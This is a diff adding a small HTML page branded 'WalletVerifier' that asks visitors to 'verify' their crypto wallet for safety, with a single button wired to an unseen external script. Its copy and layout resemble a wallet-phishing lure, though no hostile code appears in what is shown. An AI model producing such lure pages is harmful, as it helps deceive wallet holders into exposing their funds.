@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Wallet Verifier</title>
+<style>
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #f9fafb;
+    color: #222;
+    margin: 0; padding: 0;
+  }
+  header {
+    background: #3a86ff;
+    color: white;
+    padding: 1rem 2rem;
+    font-weight: 600;
+    font-size: 1.5rem;
+  }
+  main {
+    max-width: 420px;
+    margin: 3rem auto;
+    padding: 2rem;
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgb(58 134 255 / 0.2);
+    text-align: center;
+  }
+  h1 {
+    margin-bottom: 0.25rem;
+    font-weight: 700;
+    color: #3a86ff;
+  }
+  p {
+    font-size: 1rem;
+    margin-bottom: 2rem;
+    color: #555;
+  }
+  button {
+    background-color: #3a86ff;
+    border: none;
+    color: white;
+    padding: 0.75rem 2rem;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 1.1rem;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #265dcc;
+  }
+  #popupBox {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #e8f0fe;
+    color: #1a237e;
+    padding: 1.5rem 2rem;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgb(26 35 126 / 0.3);
+    font-weight: 600;
+    max-width: 300px;
+    text-align: center;
+    z-index: 9999;
+    font-size: 1rem;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<header>WalletVerifier</header>
+
+<main>
+  <h1>Secure Wallet Asset Check</h1>
+  <p>Verify your crypto wallet to ensure your funds are safe and real-time synced.</p>
+  <button id="verifyBtn">Verify Assets</button>
+</main>
+
+<div id="popupBox"></div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
